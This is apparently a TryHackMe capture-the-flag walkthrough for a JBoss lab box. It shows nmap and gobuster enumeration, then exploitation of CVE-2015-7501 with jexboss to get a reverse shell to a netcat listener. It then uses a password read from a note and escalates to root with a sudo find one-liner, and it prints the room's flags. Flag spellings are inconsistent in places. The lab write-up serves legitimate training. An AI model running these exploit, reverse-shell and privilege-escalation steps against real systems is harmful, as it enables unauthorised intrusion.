@@ -1,0 +1,424 @@
+Your first reaction to being presented with an instance should be information gathering.
+
+Answer the questions below
+
+3.1. What service is running on port “8080”?
+Apache Tomcat/Coyote JSP engine 1.1
+
+3.2. What is the name of the front-end application running on “8080”?
+JBoss
+
+Used nmap.
+nmap -T4 -n -sC -sV -Pn -p- Target_IP
+
+There are 18 ports open:
+— 22/tcp, ssh, OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13
+— 80/tcp, http, Apache httpd 2.4.7 ((Ubuntu))
+— 500/tcp, hotline?
+— 1090/tcp, java-rmi, Java RMI
+— 1091/tcp, java-rmi, Java RMI
+— 1098/tcp, java-rmi, Java RMI
+— 1099/tcp, java-object, Java Object Serialization
+— 3873/tcp, java-object, Java Object Serialization
+—4446/tcp, java-object, Java Object Serialization
+— 4712/tcp, msdtc Microsoft Distributed Transaction Coordinator (error)
+— 4713/tcp, open pulseaudio?
+— 5445/tcp, smbdirect?
+— 5455/tcp, apc-5455?
+— 5500/tcp, hotline?
+— 5501/tcp, hotline?
+— 8009/tcp, ajp13, Apache Jserv (Protocol v1.3)
+— 8080/tcp, http, Apache Tomcat/Coyote JSP engine 1.1
+— 8083/tcp, http, JBoss service httpd
+
+:~/TONYtheTIGER# nmap -T4 -n -sC -sV -Pn -p- tony.thm
+Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-13 22:26 GMT
+Nmap scan report for tony.thm (Redacted)
+Host is up (0.000079s latency).
+Not shown: 65518 closed ports
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+...
+80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
+|_http-generator: Hugo 0.66.0
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Tony&#39;s Blog
+1090/tcp open  java-rmi    Java RMI
+|_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug)
+1091/tcp open  java-rmi    Java RMI
+1098/tcp open  java-rmi    Java RMI
+1099/tcp open  java-object Java Object Serialization
+| fingerprint-strings: 
+|   NULL: 
+|     java.rmi.MarshalledObject|
+|     hash[
+|     locBytest
+|     objBytesq
+|     #http://thm-java-deserial.home:8083/q
+|     org.jnp.server.NamingServer_Stub
+|     java.rmi.server.RemoteStub
+|     java.rmi.server.RemoteObject
+|     xpwA
+|     UnicastRef2
+|_    thm-java-deserial.home
+3873/tcp open  java-object Java Object Serialization
+4446/tcp open  java-object Java Object Serialization
+4712/tcp open  msdtc       Microsoft Distributed Transaction Coordinator (error)
+4713/tcp open  pulseaudio?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
+|_    126a
+5445/tcp open  smbdirect?
+5455/tcp open  apc-5455?
+5500/tcp open  hotline?
+500/tcp open  hotline?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP: 
+|     DIGEST-MD5
+|     NTLM
+|     CRAM-MD5
+|     GSSAPI
+|     thm-java-deserial
+|   DNSVersionBindReqTCP: 
+|     NTLM
+|     GSSAPI
+|     DIGEST-MD5
+|     CRAM-MD5
+|     thm-java-deserial
+|   GenericLines, NULL: 
+|     GSSAPI
+|     CRAM-MD5
+|     NTLM
+|     DIGEST-MD5
+|     thm-java-deserial
+|   GetRequest, Help: 
+|     GSSAPI
+|     DIGEST-MD5
+|     CRAM-MD5
+|     NTLM
+|     thm-java-deserial
+|   HTTPOptions: 
+|     DIGEST-MD5
+|     CRAM-MD5
+|     NTLM
+|     GSSAPI
+|     thm-java-deserial
+|   Kerberos: 
+|     GSSAPI
+|     CRAM-MD5
+|     DIGEST-MD5
+|     NTLM
+|     thm-java-deserial
+|   RPCCheck: 
+|     CRAM-MD5
+|     DIGEST-MD5
+|     NTLM
+|     GSSAPI
+|     thm-java-deserial
+|   RTSPRequest: 
+|     NTLM
+|     DIGEST-MD5
+|     GSSAPI
+|     CRAM-MD5
+|     thm-java-deserial
+|   SSLSessionReq: 
+|     CRAM-MD5
+|     GSSAPI
+|     NTLM
+|     DIGEST-MD5
+|     thm-java-deserial
+|   TLSSessionReq: 
+|     DIGEST-MD5
+|     NTLM
+|     GSSAPI
+|     CRAM-MD5
+|     thm-java-deserial
+|   TerminalServerCookie: 
+|     DIGEST-MD5
+|     GSSAPI
+|     NTLM
+|     CRAM-MD5
+|_    thm-java-deserial
+5501/tcp open  tcpwrapped
+8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+| ajp-methods: 
+|   Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS
+|   Potentially risky methods: PUT DELETE TRACE
+|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
+8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+| http-methods: 
+|_  Potentially risky methods: PUT DELETE TRACE
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Apache-Coyote/1.1
+|_http-title: Welcome to JBoss AS
+8083/tcp open  http        JBoss service httpd
+|_http-title: Site doesn't have a title (text/html).
+5 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+...
+Nmap done: 1 IP address (1 host up) scanned in 189.55 seconds
+
+Used gobuster.
+gobuster dir -u http://hostname -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+Identified some interesting directories. /posts was one valuable.
+
+~/TONYtheTIGER# gobuster dir -u http://tony.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://tony.thm
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 304] [--> http://tony.thm/images/]
+/page                 (Status: 301) [Size: 302] [--> http://tony.thm/page/]
+/categories           (Status: 301) [Size: 308] [--> http://tony.thm/categories/]
+/posts                (Status: 301) [Size: 303] [--> http://tony.thm/posts/]
+/css                  (Status: 301) [Size: 301] [--> http://tony.thm/css/]
+/tags                 (Status: 301) [Size: 302] [--> http://tony.thm/tags/]
+/js                   (Status: 301) [Size: 300] [--> http://tony.thm/js/]
+/fonts                (Status: 301) [Size: 303] [--> http://tony.thm/fonts/]
+/server-status        (Status: 403) [Size: 288]
+Progress: 207643 / 207644 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+Task 4. Find Tony´s Flag!
+
+Tony has started a totally unbiased blog about taste-testing various cereals! He’d love for you to have a read…
+
+Answer the question below
+
+4.1. This flag will have the formatting of “THM{}”
+THM{Tony_Sure_Loves_Frosted_Flakes}
+
+Visited http://Target_IP.
+Clicked Read More.
+
+Got something interesting: I enjoyed the last bowl of Frosted Flakes! ... any photos I post must a deeper meaning ...
+
+Clicked over Tony´s picture (ATbbYpN.jpg) and saved it. Analyzed it but did not find anything special.
+
+Discovered the picture of the Frosted Flakes box in the second post.
+
+Discovered some recommendations.
+
+Saved the picture of the Frosted Flakes box : FrostedFlaked.jpg.
+
+Ran command strings FrostedFlakes.jpg.
+
+Discovered a flag.
+THM{Tony_Sure_Lovex_Frosted_Flakes}
+Task 5. Exploit!
+
+Download the attached resources (48.3MB~) to this task by pressing the “Download” icon within this task.
+
+FILE NAME: jboss.zip (48.3MB~)
+
+MD5 CHECKSUM: ED2B009552080A4E0615451DB0769F8B
+
+The attached resources are compiled together to ensure that everyone is able to complete the exploit, these resources are not my own creations (although have been very slightly modified for compatibility) and all credit is retained to the respective authors listed within “credits.txt” as well as the end of the room.
+
+It is your task to research the vulnerability CVE-2015–7501 and to use it to obtain a shell to the instance using the payload & exploit provided. There may be a few ways of doing it…If you are struggling, I have written an example of how this vulnerability is used to launch an application on Windows.
+
+There’s also a couple of ways of exploiting this service — I really encourage you to investigate into them yourself!
+
+Answer the question below
+
+5.1. I have obtained a shell.
+No answer needed
+
+Researched about CVE-2015–7501.
+https://nvd.nist.gov/vuln/detail/cve-2015-7501
+
+Learned that serialization is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them for storage, or to send as part of communications. An that deserialization is the reverse of that process, taking data structured in some format, and rebuilding it into an object. Today, the most popular data format for serializing data is JSON. Before that, it was XML.
+
+Learned that the JBoss Enterprise Application Platform (or JBoss EAP) is a subscription-based/open-source Java EE-based application server runtime platform used for building, deploying, and hosting highly-transactional Java applications and services developed and maintained by Red Hat.
+
+Decided to obtain the shell using THM AttackBox.
+1. Cloned jexboss repository and install it.
+2. Set up a listener in THM AttackBox.
+3. Ran jexboss to get the shell.
+
+:~/TonytheTiger/jexboss# nc -lvnp 4444
+
+:~/TonytheTiger/jexboss# git clone https://github.com/joaomatosf/jexboss.git
+:~/TonytheTiger/jexboss# cd jexboss
+:~/TonytheTiger/jexboss# pip install -r requires.txt
+:~/TonytheTiger/jexboss# python3 jexboss.py -h
+...
+:~/TonytheTiger/jexboss# python3 jexboss.py -h
+...
+:~/TonytheTiger/jexboss# python jexboss.py -host http://Target_IP:8080
+...
+* Checking for updates in: http://joaomatosf.com/rnp/releases.txt **
+
+** Checking Host: http://Target_IP:8080 **
+
+[*] Checking jmx-console:                 
+  [ VULNERABLE ]
+[*] Checking web-console:                 
+  [ OK ]
+[*] Checking JMXInvokerServlet:           
+  [ VULNERABLE ]
+[*] Checking admin-console:               
+  [ EXPOSED ]
+[*] Checking Application Deserialization: 
+  [ OK ]
+[*] Checking Servlet Deserialization:     
+  [ OK ]
+[*] Checking Jenkins:                     
+  [ OK ]
+[*] Checking Struts2:                     
+  [ OK ]
+
+
+* Do you want to try to run an automated exploitation via "jmx-console" ?
+  If successful, this operation will provide a simple command shell to execute 
+  commands on the server..
+  Continue only if you have permission!
+  yes/NO? no
+
+* Do you want to try to run an automated exploitation via "JMXInvokerServlet" ?
+   If successful, this operation will provide a simple command shell to execute 
+   commands on the server..
+   Continue only if you have permission!
+   yes/NO? yes
+
+ * Sending exploit code to http://[Target_IP]:8080. Please wait...
+
+ * Please enter the IP address and tcp PORT of your listening server for try to get a REVERSE SHELL.
+   OBS: You can also use the --cmd "command" to send specific commands to run on the server.
+   IP Address (RHOST): [Attack_IP]
+   Port (RPORT): 4444
+
+ * The exploit code was successfully sent. Check if you received the reverse shell
+   connection on your server or if your command was executed. 
+   Type [ENTER] to continue...
+   https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/CVE%20Exploits/JBoss%20CVE-2015-7501.py
+
+:~/TonytheTiger/jexboss# nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on [Redacted]
+bash: cannot set terminal process group (822): Inappropriate ioctl for device
+bash: no job control in this shell
+cmnatic@thm-java-deserial:/$ SHELL=/bin/bash script -q /dev/null
+SHELL=/bin/bash script -q /dev/null
+cmnatic@thm-java-deserial:/$ whoami
+cmnatic
+cmnatic@thm-java-deserial:/$ find / -type f -name user.txt 2>/dev/null
+cmnatic@thm-java-deserial:/$ grep -R "THM{" 2>/dev/null
+home/jboss/.jboss.txt:THM{50c10ad46b5793704601ecdad865eb06}
+home/jboss/.bash_history:echo "THM{50c10ad46b5793704601ecdad865eb06}" > jboss.txt
+
+Task 6 . Find User JBoss´flag!
+
+Knowledge of the Linux (specifically Ubuntu/Debian)’s file system structure & permissions is expected. If you are struggling, I strongly advise checking out the Linux Fundamentals module.
+
+Answer the question below
+
+6.1. This flag has the formatting of “THM{}”.
+THM{50c10ad46b5793704601ecdad865eb06}
+
+cmnatic@thm-java-deserial:/$ SHELL=/bin/bash script -q /dev/null
+SHELL=/bin/bash script -q /dev/null
+cmnatic@thm-java-deserial:/$ whoami
+cmnatic
+cmnatic@thm-java-deserial:/$ grep -R "THM{" 2>/dev/null
+home/jboss/.jboss.txt:THM{50c10ad46b5793704601ecdad865eb06}
+home/jboss/.bash_history:echo "THM{50c10ad46b5793704601ecdad865eb06}" > jboss.txt
+
+Task 7 . Escalation!
+
+Normal boot-to-root expectations apply here! It is located in /root/root.txt. Get cracking :)
+
+Answer the question below
+
+7.1.The final flag does not have the formatting of “THM{}”.
+zxcvbnm123456789
+
+cmnatic@thm-java-deserial:/home$ ls
+ls
+cmnatic
+jboss
+tony
+cmnatic@thm-java-deserial:/home$ cd jboss
+cd jboss
+cmnatic@thm-java-deserial:/home/jboss$ ls -la
+ls -la
+total 36
+drwxr-xr-x 3 jboss   jboss   4096 Mar  7  2020 .
+drwxr-xr-x 5 root    root    4096 Mar  6  2020 ..
+-rwxrwxrwx 1 jboss   jboss    292 Jan 23 20:26 .bash_history
+-rw-r--r-- 1 jboss   jboss    220 Mar  6  2020 .bash_logout
+-rw-r--r-- 1 jboss   jboss   3637 Mar  6  2020 .bashrc
+drwx------ 2 jboss   jboss   4096 Mar  7  2020 .cache
+-rw-rw-r-- 1 cmnatic cmnatic   38 Mar  6  2020 .jboss.txt
+-rw-r--r-- 1 jboss   jboss    675 Mar  6  2020 .profile
+-rw-r--r-- 1 cmnatic cmnatic  368 Mar  6  2020 note
+cmnatic@thm-java-deserial:/home/jboss$ cat note
+cat note
+Hey JBoss!
+
+Following your email, I have tried to replicate the issues you were having with the system.
+
+However, I don't know what commands you executed - is there any file where this history is stored that I can access?
+
+Oh! I almost forgot... I have reset your password as requested (make sure not to tell it to anyone!)
+
+Password: likeaboss
+
+Kind Regards,
+CMNatic
+cmnatic@thm-java-deserial:/home/jboss$ 
+
+~/TonytheTiger# ssh jboss@[Target_IP]
+The authenticity of host '[Target_IP] ([Target_IP])' can't be established.
+ECDSA key fingerprint is SHA256:Redacted.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[Target_IP]' (ECDSA) to the list of known hosts.
+jboss@[target_IP]'s password: 
+Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Thu Jan 23 19:04:30 GMT 2025
+
+  System load:  0.23               Processes:           118
+  Usage of /:   10.5% of 18.58GB   Users logged in:     0
+  Memory usage: 4%                 IP address for eth0: [Target_IP]
+  Swap usage:   0%
+
+  Graph this data and manage this system at:
+    https://landscape.canonical.com/
+
+Your Hardware Enablement Stack (HWE) is supported until April 2019.
+Last login: Sat Mar  7 00:35:29 2020
+jboss@thm-java-deserial:~$ sudo -l
+Matching Defaults entries for jboss on thm-java-deserial:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jboss may run the following commands on thm-java-deserial:
+    (ALL) NOPASSWD: /usr/bin/find
+jboss@thm-java-deserial:~$ sudo find . -exec /bin/bash \; -quit
+root@thm-java-deserial:~# pwd
+/home/jboss
+root@thm-java-deserial:~# cd /root
+root@thm-java-deserial:/root# ls
+root.txt
+root@thm-java-deserial:/root# cat root.txt
+QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==
+root@thm-java-deserial:/root# cat root.txt | base64 -d
+BC77AC072EE30E3760806864E234C7CFbase64: invalid input
+root@thm-java-deserial:/root#
+
+Discovered BC77AC072EE30E3760806864E234C7CF. Used CrackStation to crack this hash. Discovered the flag zxcvbnm123456789.
